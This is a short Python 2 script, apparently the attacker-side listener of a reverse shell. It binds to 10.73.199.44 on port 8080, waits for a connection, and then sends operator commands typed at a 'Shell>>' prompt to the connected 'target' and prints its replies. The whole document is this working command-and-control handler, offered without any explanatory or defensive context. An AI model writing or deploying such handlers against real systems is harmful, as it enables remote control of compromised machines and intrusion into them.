#!/usr/bin/python

import socket

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("10.73.199.44", 8080))
	s.listen(1)
	conn, addr = s.accept()
	print "We are connected to ", addr
	while True:
		cmd = raw_input("Shell>>")
		if 'exit' in cmd:
			conn.send('exit')
			conn.close()
			break
		else:
			conn.send(cmd)
			print "Response from the target is:\n"
			print conn.recv(1024)
def main():
	connect()

main()

